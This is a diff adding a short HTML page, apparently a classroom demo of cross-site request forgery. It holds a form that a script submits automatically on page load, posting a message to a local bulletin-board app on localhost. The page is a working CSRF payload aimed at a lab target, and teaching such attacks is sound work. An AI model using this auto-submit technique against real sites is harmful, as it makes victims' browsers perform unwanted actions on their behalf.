@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head></head>
+<body>
+<h2>Dimmi</h2>
+<form method="post" id="form" action="http://localhost:8888/02-bacheca/messages.php">
+    <textarea name="testo" rows="4">Messaggio inviato da un altro sito (demo CSRF)</textarea>
+    <Input type="submit" value="Invia">
+</form>
+<script>
+    document.getElementById('form').submit();
+</script>
+</body>
+</html>
